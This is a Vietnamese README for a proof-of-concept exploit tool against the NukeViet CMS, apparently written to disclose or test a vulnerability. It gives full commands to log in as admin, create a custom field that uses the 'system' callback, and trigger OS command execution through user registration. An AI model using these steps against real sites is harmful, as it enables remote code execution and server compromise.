## Cách sử dụng

Tool hỗ trợ 4 chức năng chính:

### 1. Đăng nhập Admin

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --user admin \
  --password 'MậtKhẩuAdmin'
```

| Tham số      | Bắt buộc | Mô tả                                          |
| ------------ | -------- | ---------------------------------------------- |
| `--url`      | Không    | URL NukeViet, mặc định `http://localhost:8080` |
| `--user`     | Có       | Tài khoản Admin                                |
| `--password` | Có       | Mật khẩu Admin                                 |

Session sau khi đăng nhập được lưu vào `admin_session.cookies`.

---

### 2. Kiểm tra Session Admin

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --whoami
```

Kiểm tra `admin_session.cookies` còn hiệu lực hay không.

---

### 3. Tạo Custom Field

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --test-field nv_poc_rce
```

| Tham số        | Bắt buộc | Mô tả                    |
| -------------- | -------- | ------------------------ |
| `--test-field` | Có       | Tên custom field cần tạo |
| `--url`        | Không    | URL NukeViet             |

Field được tạo với `match_type=callback` và callback `system`.

---

### 4. Kích hoạt PoC qua đăng ký

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --register \
  --reg-field 'nv_poc_rce=id'
```

| Tham số       | Bắt buộc | Mô tả                                 |
| ------------- | -------- | ------------------------------------- |
| `--register`  | Có       | Thực hiện đăng ký user                |
| `--reg-field` | Có       | Custom field theo dạng `NAME=VALUE`   |
| `--reg-user`  | Không    | Username test, mặc định tự sinh       |
| `--reg-email` | Không    | Email test, mặc định tự sinh          |
| `--reg-pass`  | Không    | Mật khẩu, mặc định `Password123@!`    |
| `--config`    | Không    | Đường dẫn `config.php` để đọc sitekey |

Ví dụ:

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --register \
  --reg-user pocuser01 \
  --reg-email pocuser01@example.com \
  --reg-pass 'Password123@!' \
  --reg-field 'nv_poc_rce=id'
```

> **Lưu ý:** Chỉ sử dụng tool trên hệ thống NukeViet thuộc quyền kiểm thử của bạn hoặc môi trường lab được cấp phép.
